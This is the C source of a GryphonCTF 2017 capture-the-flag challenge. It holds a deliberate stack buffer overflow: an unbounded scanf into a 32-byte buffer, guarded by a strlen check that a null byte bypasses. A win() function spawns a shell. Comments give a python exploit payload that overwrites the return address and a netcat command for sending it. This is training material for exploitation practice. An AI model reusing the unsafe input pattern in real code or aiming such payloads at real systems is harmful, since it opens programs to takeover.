/**
 * Created for the GryphonCTF 2017 challenges
 * By Amos (LFlare) Ng <amosng1@gmail.com>
**/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// (cat payload; cat -) | nc {} {}
// python -c 'print "a"*20+"\x00"+"AAAABBBBCCCCDDD" + "\x7b\x85\x04\x08"'
int win() {
    puts("B-baka! It's not like I like you or anything!");
    system("/bin/sh");
}

int main() {
    // Disable output buffering
    setbuf(stdout, NULL);

    // Declare main variables
    char input[32];

    // User preface
    puts("I check input length now! Your attacks have no effect on me anymore!!!");
    printf("Your response? ");

    // Read user input
    scanf("%s", input);

    // "Check" for buffer overflow
    if (strlen(input) > 32) {
        exit(1);
    }
}